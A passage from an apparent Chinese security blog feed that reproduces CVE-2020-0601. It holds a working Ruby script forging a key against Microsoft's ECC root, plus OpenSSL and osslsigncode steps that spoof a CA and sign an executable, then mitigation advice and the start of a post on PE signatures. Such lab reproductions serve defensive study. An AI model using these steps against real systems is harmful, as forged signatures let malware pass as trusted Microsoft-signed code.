href="#2-前置知识" class="headerlink" title="2. 前置知识"></a>2. 前置知识</h1><h2 id="2-1-ECC加密算法"><a href="#2-1-ECC加密算法" class="headerlink" title="2.1 ECC加密算法"></a>2.1 ECC加密算法</h2><p>基础知识：ECC私钥+椭圆曲线=ECC公钥</p><p>漏洞成因：微软的私钥+微软选的椭圆曲线=微软根证书里的公钥</p><p>​                    黑客的私钥+黑客选的椭圆曲线=微软根证书里的公钥</p><p>不同的椭圆曲线和不同的私钥，能产生相同的公钥。Win 10默认添加了微软的ECC根证书，在做证书验证时，会一直验证到微软根证书中的公钥hash值，这个值直接写在了<code>crypt32.dll</code>里面，验证时没有对比是不是同一个椭圆曲线，只对比了公钥值，导致黑客拿自己的私钥签名，就能伪装成微软的签名。</p><p>要形象地理解椭圆曲线加密算法，可以结合图形来看，以下是一个符合椭圆曲线的方程及图像。</p><script type="math/tex; mode=display">y^2=x^3+ax+b</script><img src="/posts/2ae8b8b2/1.2.1.png" class="" title="椭圆曲线"><p>椭圆曲线具有一些独特的性质使它适合用于加密算法：</p><ul><li>椭圆曲线关于x轴对称</li><li>任何一条非垂直的线与曲线最多有三个点相交</li><li>曲线是光滑的，即曲线的所有点都没有两个及以上的不同的切线</li></ul><p>在椭圆曲线上任意两点A、B，作直线交于椭圆曲线另一点C’，过C’作y轴的平行线与椭圆曲线交于C点，定义A+B=C。椭圆曲线的加法符合交换律和结合律。</p><img src="/posts/2ae8b8b2/1.2.2.png" class="" title="椭圆曲线"><p>如果A、B点重合，则过A作椭圆曲线的切线，以同样的方法得到对应的结果C=2A。</p><img src="/posts/2ae8b8b2/1.2.3.png" class="" title="椭圆曲线"><p>接下来是椭圆曲线加密相关的重点，如果对n个A进行累加，则可依次累加连线得到nA的值。</p><ol><li>起点为A，终点D=3A，阶为3</li><li>起点为A，终点G=4A，阶为4</li></ol><img src="/posts/2ae8b8b2/1.2.4.png" class="" title="椭圆曲线"><p><strong>椭圆曲线加密算法的数学依据：</strong></p><p>考虑K=kG，其中K、G为椭圆曲线Ep(a,b)上的点，n为G的阶。k为小于n的整数。给定k和G，根据加法法则计算K很容易(逐次求解)；但反过来，给定K和G，求k就非常困难。因为实际使用中的ECC原则上把私钥k取得相当大，n也相当大，且椭圆曲线不再连续而是在实数内离散的值，要把n个离散的值逐一算出几乎是不可能的。</p><img src="/posts/2ae8b8b2/1.2.5.png" class="" title="椭圆曲线"><ul><li>点G称为基点</li><li>k(k&lt;n)为私有密钥</li><li>K为公开密钥</li></ul><p><strong>ECC和RSA加密算法对比：</strong></p><p>椭圆曲线加密算法(ECC)和RSA同样是一种公钥密钥加密技术，对原始数据以公钥加密，以私钥解密，即便攻击者获取密文和公钥也无法(在合理的时间或代价下)解密获取明文。ECC常被应用于数字签名，以私钥加密生成签名，以公钥解密验证签名，如果和原文一样则签名验证成功。公开密钥加密之所以可靠是因为它们利用了公钥密码领域的单向函数原理，正向操作非常简单，而逆向操作非常困难。</p><p>由G(基点)出发，进行k(私钥)次变换，很容易地得到终点K(公钥)的值。</p><img src="/posts/2ae8b8b2/1.2.6.png" class="" title="椭圆曲线"><p>已知G(基点)和K(公钥)，要逆推得到移动次数k(私钥)则是一个很难的问题。</p><img src="/posts/2ae8b8b2/1.2.7.png" class="" title="椭圆曲线"><p>相比传统的RSA加密算法，椭圆加密算法具有着天生的优势，椭圆加密算法的逆向过程相比RSA有着更大的时间复杂度。在密钥长度相同的情况下，椭圆加密算法相比RSA具有更好的安全强度。一般认为，160比特的椭圆曲线即可提供与1024比特的RSA密钥相当的安全强度。</p><p>较短的密钥也意味着更少的存储空间、更快的加解密速度和更少的带宽消耗，正因为椭圆加密算法的这些优势，它被用于Windows的签名系统、HTTPS的证书、比特币系统和中国的二代身份证系统中。</p><p>虽然椭圆曲线加密算法具有着许多优势，纯算法角度攻破难度极大，微软对此算法的实现的缺漏却给漏洞利用提供了可乘之机。回到椭圆曲线加密最基本的等式K=kG，首先需要明确的是，虽然对于给定的基点G和公钥K，要求解私钥k很困难，但如果可以任意指定基点G，要构造一对k和G使等式成立却极其简单。最简单的情况，令基点G=K，则私钥k=1，这样一对基点和私钥可以使等式成立，也是有效的解。</p><img src="/posts/2ae8b8b2/1.2.8.png" class="" title="椭圆曲线"><p>在正常的标准椭圆曲线算法中，基点G并不是随意指定的，而是有固定的值(标准文件会对基点G等参数的选择作出规定)，例如在secp256r1版本的椭圆曲线算法中，基点G应当为标准规定的固定值，如果对参数不加验证，使得用户可以自定义传入的基点G值(作为函数的参数)，上面的私钥k=1的特殊解即可成立。</p><p>在有漏洞版本的<code>crypt32.dll</code>中验证使用ECC算法签名部分的函数恰恰是这个情况，原先的函数未加参数验证，参与计算的基点G的内容由被验证的证书随意指定，使未授权的证书能够构建私钥k=1的特殊解来成功通过椭圆加密算法的签名验证的过程。</p><h2 id="2-2-Windows证书验证"><a href="#2-2-Windows证书验证" class="headerlink" title="2.2 Windows证书验证"></a>2.2 Windows证书验证</h2><p>以SSL协议为例，讲解Windows如何进行证书验证。小明(m)在某电商(x)网站上购买了一本书，这时就调用了SSL协议进行通讯，建立SSL协议的步骤总结为下图：</p><img src="/posts/2ae8b8b2/1.2.9.jpg" class="" title="SSL协议"><p>基本步骤包括：</p><ol><li>打招呼：小明和电商互相介绍自己，小明和电商协商好以后的步骤里将使用到的特定密码算法。在本漏洞中，该算法为ECC加密算法。(该步骤没有利用密码工具)</li><li>身份验证：电商向小明验证自己的身份，电商发送包含自己的公钥的证书，该证书由权威的第三方证书机构(CA)颁发。小明使用CA的公开验证密钥，验证证书中对PK的签名。(漏洞触发地方)</li><li>信息加密：由小明生成一个随机的密钥MS，该密钥用于生成对双方传输的信息进行对称加密的$K_1$与$K_2$。MS由小明从电商那里获得的证书公钥进行加密并交给电商。电商通过手中的私钥解密获得MS。这时双方都获得了用于进行加密通讯的密钥。</li></ol><p>注意：</p><ul><li>在SSL会话过程中，只有电商一方被要求提供证书，小明可能根本没有公钥(或证书)。</li><li>该漏洞的触发点在于第三方权威机构在步骤2验证证书时产生的逻辑漏洞，使得攻击者可以通过伪造证书将自身伪装成电商，与小明进行通讯。</li><li>通过及时更新微软补丁包可以有效防止上述情况发生。</li></ul><h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h1><h2 id="3-1-环境配置"><a href="#3-1-环境配置" class="headerlink" title="3.1 环境配置"></a>3.1 环境配置</h2><p>靶机：Win 10 家庭版 x64</p><p>利用工具：</p><ul><li>WSL(Windows Subsystem for Linux)</li><li>Ruby环境</li></ul><h2 id="3-2-复现准备"><a href="#3-2-复现准备" class="headerlink" title="3.2 复现准备"></a>3.2 复现准备</h2><p>下载并安装WSL，“以管理员身份运行”Powershell，输入命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --install</span><br></pre></td></tr></table></figure><p>更多个性化设置看<a href="https://docs.microsoft.com/zh-cn/windows/wsl/install">使用 WSL 在 Windows 上安装 Linux</a>。</p><img src="/posts/2ae8b8b2/3.2.1.png" class="" title="安装WSL"><p>安装完成后重启，输入命令安装Ubuntu发行版：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --install --distribution Ubuntu</span><br></pre></td></tr></table></figure><p>创建用户账号和密码，与Windows的账号密码不相关。</p><img src="/posts/2ae8b8b2/3.2.2.png" class="" title="创建账号密码"><p>此后再次打开子系统直接在CMD窗口输入命令<code>wsl</code>即可。子系统与VMware中的虚拟机互斥，要想开启虚拟机，则在CMD窗口输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set hypervisorlaunchtype off</span><br></pre></td></tr></table></figure><p>重启。如果想打开子系统，则需设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set hypervisorlaunchtype auto</span><br></pre></td></tr></table></figure><p>在Ubuntu的基础上安装Ruby环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ruby</span><br></pre></td></tr></table></figure><p>导出微软的任意一个ECC密钥证书，这是微软在实现椭圆曲线加密(ECC)算法的数字证书，位于<code>CryptoAPI.dll</code>文件，也是被我们用来伪造可信任来源的签名漏洞。导出方法请看<a href="https://v5le0n9.github.io/posts/8fb0b0f6.html#1-2-2-微软数字签名证书">PE数字签名 1-2-2微软数字签名证书</a>。</p><h2 id="3-3-复现过程"><a href="#3-3-复现过程" class="headerlink" title="3.3 复现过程"></a>3.3 复现过程</h2><p>将<code>main.rb</code>文件和导出的微软ECC签名证书文件复制到WSL。</p><img src="/posts/2ae8b8b2/3.3.1.png" class="" title="复制到WSL"><p>接着运行Ruby代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby main.rb ./MicrosoftECCProductRootCertificateAuthority.cer</span><br></pre></td></tr></table></figure><p>生成<code>spoofed_ca.key</code>公钥文件。</p><img src="/posts/2ae8b8b2/3.3.2.png" class="" title="spoofed_ca.key"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN EC PRIVATE KEY-----</span><br><span class="line">MIIB+gIBAQQwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAABoIIBWzCCAVcCAQEwPAYHKoZIzj0BAQIxAP//////////////////</span><br><span class="line">///////////////////////+/////wAAAAAAAAAA/////zB7BDD/////////////</span><br><span class="line">/////////////////////////////v////8AAAAAAAAAAP////wEMLMxL6fiPufk</span><br><span class="line">mI4Fa+P4LRkYHZxu/oFBEgMUCI9QE4daxlY5jYou0Z0qhcjt0+wq7wMVAKM1kmqj</span><br><span class="line">GaJ6HQCJamdzpIJ6zaxzBGEExxEWKnYdVo6+uWJl1MPOtPDDMOyPbdduObzISaur</span><br><span class="line">uONDeNWBBl3vx32fztazkHXeDLCQ3iO6yNE+Z+AZqRuGMR5fNC3uF/0V+34nijKh</span><br><span class="line">6smPyX4Yyy87LEh6fab0AQesAjEA////////////////////////////////x2NN</span><br><span class="line">gfQ3Ld9YGg2ySLCneuzsGWrMxSlzAgEBoWQDYgAExxEWKnYdVo6+uWJl1MPOtPDD</span><br><span class="line">MOyPbdduObzISauruONDeNWBBl3vx32fztazkHXeDLCQ3iO6yNE+Z+AZqRuGMR5f</span><br><span class="line">NC3uF/0V+34nijKh6smPyX4Yyy87LEh6fab0AQes</span><br><span class="line">-----END EC PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p><code>main.rb</code>代码如下，设置私钥为1，使得加密等式成立，并生成证书公钥文件。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;openssl&#x27;</span></span><br><span class="line"></span><br><span class="line">raw = File.read <span class="variable constant_">ARGV</span>[<span class="number">0</span>]</span><br><span class="line">ca = <span class="title class_">OpenSSL::X509::Certificate</span>.new(raw) <span class="comment"># Read certificate</span></span><br><span class="line">ca_key = ca.public_key <span class="comment"># Parse public key from CA</span></span><br><span class="line"></span><br><span class="line">ca_key.private_key = <span class="number">1</span> <span class="comment"># Set a private key, which will match Q = d&#x27;G&#x27;</span></span><br><span class="line">group = ca_key.group</span><br><span class="line">group.set_generator(ca_key.public_key, group.order, group.cofactor)</span><br><span class="line">group.asn1_flag = OpenSSL::PKey::<span class="variable constant_">EC</span><span class="symbol">:</span><span class="symbol">:EXPLICIT_CURVE</span></span><br><span class="line">ca_key.group = group <span class="comment"># Set new group with fake generator G&#x27; = Q</span></span><br><span class="line"></span><br><span class="line">File.open(<span class="string">&quot;spoofed_ca.key&quot;</span>, <span class="string">&#x27;w&#x27;</span>) &#123; |<span class="params">f</span>| f.write ca_key.to_pem &#125;</span><br></pre></td></tr></table></figure><p>基于此密钥生成一个新的x509证书，这将是我们自己的欺骗性CA。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt</span><br></pre></td></tr></table></figure><img src="/posts/2ae8b8b2/3.3.3.png" class="" title="spoofed_ca.crt"><p>国家、地区等等这些可以随便填，生成<code>spoofed_ca.crt</code>公钥文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIDnjCCAySgAwIBAgIUT60jMVGMy5H1KVo51W4nLMUvlUkwCgYIKoZIzj0EAwIw</span><br><span class="line">WjELMAkGA1UEBhMCV1gxDDAKBgNVBAgMA0xXWDEPMA0GA1UEBwwGQVlHWllMMQww</span><br><span class="line">CgYDVQQKDANZQ0YxDDAKBgNVBAsMAzIzMzEQMA4GA1UEAwwHdjVsZTBuOTAeFw0y</span><br><span class="line">MjA3MDgxNDA3MjFaFw0yMjA4MDcxNDA3MjFaMFoxCzAJBgNVBAYTAldYMQwwCgYD</span><br><span class="line">VQQIDANMV1gxDzANBgNVBAcMBkFZR1pZTDEMMAoGA1UECgwDWUNGMQwwCgYDVQQL</span><br><span class="line">DAMyMzMxEDAOBgNVBAMMB3Y1bGUwbjkwggHMMIIBZAYHKoZIzj0CATCCAVcCAQEw</span><br><span class="line">PAYHKoZIzj0BAQIxAP/////////////////////////////////////////+////</span><br><span class="line">/wAAAAAAAAAA/////zB7BDD/////////////////////////////////////////</span><br><span class="line">/v////8AAAAAAAAAAP////wEMLMxL6fiPufkmI4Fa+P4LRkYHZxu/oFBEgMUCI9Q</span><br><span class="line">E4daxlY5jYou0Z0qhcjt0+wq7wMVAKM1kmqjGaJ6HQCJamdzpIJ6zaxzBGEExxEW</span><br><span class="line">KnYdVo6+uWJl1MPOtPDDMOyPbdduObzISauruONDeNWBBl3vx32fztazkHXeDLCQ</span><br><span class="line">3iO6yNE+Z+AZqRuGMR5fNC3uF/0V+34nijKh6smPyX4Yyy87LEh6fab0AQesAjEA</span><br><span class="line">////////////////////////////////x2NNgfQ3Ld9YGg2ySLCneuzsGWrMxSlz</span><br><span class="line">AgEBA2IABMcRFip2HVaOvrliZdTDzrTwwzDsj23Xbjm8yEmrq7jjQ3jVgQZd78d9</span><br><span class="line">n87Ws5B13gywkN4jusjRPmfgGakbhjEeXzQt7hf9Fft+J4oyoerJj8l+GMsvOyxI</span><br><span class="line">en2m9AEHrKNTMFEwHQYDVR0OBBYEFEPvcIe4nb/siBncxsRrdQ11NDMIMB8GA1Ud</span><br><span class="line">IwQYMBaAFEPvcIe4nb/siBncxsRrdQ11NDMIMA8GA1UdEwEB/wQFMAMBAf8wCgYI</span><br><span class="line">KoZIzj0EAwIDaAAwZQIxAMEufTnFga8x12v62Sh3GFqNbEYV10JiZCDyCvq6AJBI</span><br><span class="line">+KcouXc8fG1wctZ00t9qrQIwSZDpKeKQaQJIzJSC/0cmiUGyhQhRT8KkM4d/zLXr</span><br><span class="line">wfzVUW6NaVjoOiBIGagB1jXX</span><br><span class="line">-----END CERTIFICATE-----</span><br></pre></td></tr></table></figure><p>使用下面命令生成一个新密钥，该密钥可以是我们想要的任何类型，它将用于创建代码签名证书，我们将使用自己的CA对其进行签名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl ecparam -name secp384r1 -genkey -noout -out cert.key</span><br></pre></td></tr></table></figure><p>生成<code>cert.key</code>新密钥文件。</p><img src="/posts/2ae8b8b2/3.3.4.png" class="" title="cert.key"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN EC PRIVATE KEY-----</span><br><span class="line">MIGkAgEBBDCAStK2Htw/59O0noNiH5S1h26FWYO2nG58Gm3mWvskqI2iNmHaMckI</span><br><span class="line">rdlMLGfQ/QWgBwYFK4EEACKhZANiAAR5OFuxa8zYDkJ8cAo52gUJ4p8+J5johGhZ</span><br><span class="line">u3rwbSz0AU/vvuYfQO6N88q9a0KtlWqZA7GiwZ0mmG3ZhhzpRtkf2Uxq/9pHgEPA</span><br><span class="line">pp5LrQMLZPCw0gki3VAyN41+DJWtLWQ=</span><br><span class="line">-----END EC PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>接下来创建一个新的证书签名请求(CSR)，该请求通常会发送到受信任的CA，但是由于存在欺骗请求，因此我们可以自己对其进行签名。</p><p>前提是我们把<code>openssl_cs.conf</code>复制到该目录下，此时生成<code>cert.csr</code>文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -key cert.key -out cert.csr -config openssl_cs.conf -reqexts v3_cs</span><br></pre></td></tr></table></figure><img src="/posts/2ae8b8b2/3.3.5.png" class="" title="cert.csr"><p>使用我们的欺骗性CA和CA密钥签署的新CSR，生成<code>cert.crt</code>证书，有效期10000天，即2049年到期，而真正的受信任Microsoft ECC CA在2043年到期。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -req -in cert.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_cs.conf -extensions v3_cs</span><br></pre></td></tr></table></figure><img src="/posts/2ae8b8b2/3.3.6.png" class="" title="cert.crt"><p>将证书的密钥和欺骗性的CA打包到一个PKCS12文件中，以对可执行文件进行签名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in cert.crt -inkey cert.key -certfile spoofed_ca.crt -name &quot;Code Signing&quot; -out cert.p12</span><br></pre></td></tr></table></figure><p>让输入密码时直接回车(否则后面签名时会失败)，生成<code>cert.p12</code>证书文件。</p><img src="/posts/2ae8b8b2/3.3.7.png" class="" title="cert.p12"><p>安装osslsigncode：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install osslsigncode</span><br></pre></td></tr></table></figure><p>出现以下错误：</p><img src="/posts/2ae8b8b2/3.3.8.png" class="" title="出现错误"><p>执行命令<code>sudo apt-get update</code>再下载想要安装的软件即可。</p><p>用PKCS12文件签名某个可执行文件，如这里的<code>python.exe</code>。(<code>python.exe</code>要在本目录下或在命令里修改为绝对路径)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">osslsigncode sign -pkcs12 cert.p12 -n &quot;Signed by ollypwn&quot; -in python.exe -out python_signed.exe</span><br></pre></td></tr></table></figure><img src="/posts/2ae8b8b2/3.3.9.png" class="" title="对可执行文件签名"><p>查看<code>python_signed.exe</code>文件的数字签名详细信息，比如2049年到期，颁发者为v5le0n9，以及设置的签名信息，证书可靠。该可执行文件的数字签名校验通过，并且成功欺骗了系统。(下面两图为借用)</p><img src="/posts/2ae8b8b2/3.3.11.png" class="" title="查看数字证书"><img src="/posts/2ae8b8b2/3.3.10.png" class="" title="查看数字证书"><p>由于我更新了补丁，<code>python_signed.exe</code>文件报毒并且它的数字签名显示无法验证。</p><img src="/posts/2ae8b8b2/3.3.12.png" class="" title="查看数字证书"><h1 id="4-防御措施"><a href="#4-防御措施" class="headerlink" title="4. 防御措施"></a>4. 防御措施</h1><h2 id="4-1-缓解措施"><a href="#4-1-缓解措施" class="headerlink" title="4.1 缓解措施"></a>4.1 缓解措施</h2><p>快速采用补丁是目前已知较好的缓解措施。尽管尚未出现公开的攻击方式和案例，但建议及时安装安全更新。更新后，当检测到有人试图利用CVE-2020-0601进行攻击时，系统将在每次重新启动Windows日志后在事件查看器中生成事件ID。</p><h2 id="4-2-安全建议"><a href="#4-2-安全建议" class="headerlink" title="4.2 安全建议"></a>4.2 安全建议</h2><p>除了安装补丁程序之外，企业还可以采取其它措施保护端点，比如：</p><ul><li>从网络流量中提取证书，检查可疑的属性；</li><li>通过执行TLS检查，不使用Windows进行证书验证的代理设备承载流量；</li><li>在企业内部部署私有根证书颁发机构，并且在特定计算机/服务器位置控制第三方软件的部署和使用；</li><li>符合条件的企业可以申请假如微软Security Update Validation Program(SUVP)或Microsoft Active Protections Program(MAPP)，从而提前从微软获得安全更新以进行相关的测试分析。</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;基于&lt;a href=&quot;https://v5le0n9.github.io/posts/8fb0b0f6.html&quot;&gt;PE数字签名&lt;/a&gt;，微软证书漏洞(CVE-2020-0601)在实现椭圆曲线加密(ECC)算法数字证书验证时产生，位于&lt;code&gt;CryptoAPI.dll&lt;/code&gt;文件。可被利用与伪造来组可信任来源的签名或证书，并且因其业务特性会衍生出多种攻击向量，具有极高的可利用价值和极大的潜在破坏力。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>PE数字签名</title>
    <link href="http://example.com/posts/8fb0b0f6.html"/>
    <id>http://example.com/posts/8fb0b0f6.html</id>
    <published>2022-07-03T03:00:54.381Z</published>
    <updated>2022-07-07T05:47:22.383Z</updated>
    
    <content type="html"><![CDATA[<p>在做Android逆向题时就遇到过对APK文件进行签名的题，奇安信面试官跟我说，无论是做哪个平台的逆向，它的大方向、学习路径总是相似的。比如Android逆向有签名、有Hook和注入技术，Windows逆向也是有的。所以这篇笔记就是学习PE文件的数字签名。</p><span id="more"></span><h1 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1. 基础概念"></a>1. 基础概念</h1><p>PE文件全称是Portable Executable，意为可移植的可执行文件，常见的EXE、DLL、OCX、SYS、COM等都是PE文件。</p><p>为什么要对PE文件进行数字签名呢？</p><ul><li>防篡改：通过对数字签名的验证，保证文件未被非法篡改</li><li>降低误报：安全软件通过验证文件是否有正规厂商的数字签名来降低误报</li></ul><p>PE文件数字签名信息存放在<code>Certificate Table</code>位置，同时PE文件可选文件头<code>DataDirectory</code>第5项记录文件偏移及大小。</p><img src="/posts/8fb0b0f6/1.1.2.png" class="" title="数字签名存放位置"><p>使用PEView查看签名前后对比图，可以看到<code>Certificate Table</code>存储相关签名信息。</p><img src="/posts/8fb0b0f6/3.1.11.png" class="" title="数字签名证书"><h2 id="1-1-PE文件数字签名及验证过程"><a href="#1-1-PE文件数字签名及验证过程" class="headerlink" title="1.1 PE文件数字签名及验证过程"></a>1.1 PE文件数字签名及验证过程</h2><p>签名：</p><ol><li>软件发布者使用散列算法(如MD5或SHA)计算PE文件的散列值</li><li>软件发布者使用私钥对散列值进行签名得到签名数据</li><li>将签名私钥对应的公钥和签名数据等以证书的形式附加在PE文件中，形成经过数字签名的PE文件</li><li>软件发布者将经过数字签名的PE文件进行发布</li></ol><p>验证：</p><ol><li>从PE文件证书中提取软件发布者的公钥、使用的散列算法、签名算法、原始散列值的签名数据</li><li>使用提取的公钥和对应签名验证算法将签名数据还原为原始PE文件的原始散列值</li><li>对现有PE文件使用同样的散列算法计算出对应的散列值</li><li>对比两个散列值是否一致，从而判断数据是否被破坏或篡改</li></ol><img src="/posts/8fb0b0f6/1.1.1.png" class="" title="签名与验证过程"><h2 id="1-2-查看数字签名"><a href="#1-2-查看数字签名" class="headerlink" title="1.2 查看数字签名"></a>1.2 查看数字签名</h2><h3 id="1-2-1-PE文件数字签名证书"><a href="#1-2-1-PE文件数字签名证书" class="headerlink" title="1.2.1 PE文件数字签名证书"></a>1.2.1 PE文件数字签名证书</h3><p>以<code>toDesk.exe</code>为例，可以看到经过数字签名后的PE文件会多出一个“数字签名”属性，点击详细信息可以查看对应的证书。对应的证书信息包括签名算法、哈希算法、有效期、颁发者信息等。</p><img src="/posts/8fb0b0f6/1.2.1.png" class="" title="数字签名证书"><img src="/posts/8fb0b0f6/1.2.2.png" class="" title="数字签名证书"><h3 id="1-2-2-微软数字签名证书"><a href="#1-2-2-微软数字签名证书" class="headerlink" title="1.2.2 微软数字签名证书"></a>1.2.2 微软数字签名证书</h3><p>徽标键 + R -&gt; 输入<code>certmgr.msc</code>，可以看到这里面有2个系统默认的椭圆曲线加密(ECC)算法的根证书。随意选择一个导出，右键 -&gt; 所有任务 -&gt; 导出，选择Base64编码。</p><img src="/posts/8fb0b0f6/1.2.3.png" class="" title="导出微软数字签名证书"><p>可以看到导出的ECC密钥证书如下图所示，包括证书的有效期等信息。这就是微软在实现椭圆曲线加密(ECC)算法的数字证书，位于<code>CryptoAPI.dll</code>文件，也是被我们利用伪造可信任来源的签名漏洞。</p><img src="/posts/8fb0b0f6/1.2.4.png" class="" title="导出微软数字签名证书"><h2 id="1-3-数字签名常用算法及应用领域"><a href="#1-3-数字签名常用算法及应用领域" class="headerlink" title="1.3 数字签名常用算法及应用领域"></a>1.3 数字签名常用算法及应用领域</h2><p>数字签名常用算法包括：</p><ul><li>RSA数字签名算法：基于大整数分解问题，MD5、SHA</li><li>DSA数字签名算法：基于离散对数问题</li><li>ECDSA椭圆曲线数字签名算法：ECC+DSA，椭圆加密算法，属于DSA的一个变种，基于椭圆曲线上的离散对数问题</li></ul><p>其应用领域包括：</p><ul><li>PE文件数字签名</li><li>HTTPS数字签名</li><li>电子邮件数字签名</li><li>Office文档数字签名</li><li>代码数字签名</li></ul><h1 id="2-Github网站证书验证过程"><a href="#2-Github网站证书验证过程" class="headerlink" title="2. Github网站证书验证过程"></a>2. Github网站证书验证过程</h1><p>在Windows系统访问一个网站(如Github.com)时，该网站会向Windows系统发送由第三方权威机构(CA)签署的网站证书。</p><img src="/posts/8fb0b0f6/2.1.1.png" class="" title="Github网站证书验证过程"><p>Windows系统则会验证该证书是否由CA颁发，若验证通过，则Windows系统与网站成功建立TLS连接。</p><img src="/posts/8fb0b0f6/2.1.2.png" class="" title="Github网站证书验证过程"><p>为了方便下一次更快地访问，Windows将验证成功的证书放入内存中一块<code>Cetificate Cache</code>(证书缓存)中。在下一次验证时，如果该证书存在于缓存中，则直接取缓存中的值进行验证。</p><img src="/posts/8fb0b0f6/2.1.3.png" class="" title="Github网站证书验证过程"><p>微软证书漏洞(CVE-2020-0601)就是利用这一机制。在成功缓存证书数据后，根据Windows证书缓存机制，恶意网站可以伪造虚假的网站证书且通过Windows验证，将自身伪装成合法网站。</p><img src="/posts/8fb0b0f6/2.1.4.png" class="" title="Github网站证书验证过程"><p>当Windows接受到新的证书时，Windows将新接收的证书与已缓存证书的证书公钥进行遍历对比，寻找匹配的值。</p><img src="/posts/8fb0b0f6/2.1.5.png" class="" title="Github网站证书验证过程"><p>伪造的恶意证书与Windows系统中的缓存证书有同样的公钥，但Curve项没有在校验范围内，所以可以通过构造自定义Curve来伪造证书，使得证书验证流程依然成立，但通过验证的证书已经不是之前成功验证的安全证书。</p><img src="/posts/8fb0b0f6/2.1.6.png" class="" title="Github网站证书验证过程"><h1 id="3-Signtool签名PE文件"><a href="#3-Signtool签名PE文件" class="headerlink" title="3. Signtool签名PE文件"></a>3. Signtool签名PE文件</h1><p>PE文件数字签名所使用的工具包括：</p><ul><li><code>makecert.exe</code>：生成数字签名证书</li><li><code>signcode.exe</code>：数字签名工具</li><li><code>test.exe</code>：被数字签名的目标PE文件</li><li><code>test.cer</code>：数字证书文件</li><li><code>test.PVK</code>：数字签名的私钥文件</li></ul><p>假设<code>test.exe</code>是要被数字签名的PE文件，首先我们要通过<code>makecert.exe</code>生成需要的证书，生成两个文件分别是<code>test.cer</code>和<code>test.PVK</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">makecert -$ &quot;individual&quot; -r /sv &quot;test.PVK&quot; /n &quot;CN=Windows,E=microsoft,O=微软&quot; test.cer</span><br></pre></td></tr></table></figure><p>其中，通过<code>makecert.exe</code>生成需要的证书常见参数如下：</p><ul><li>-r：自签名</li><li>-n：证书名称，格式为<code>-n 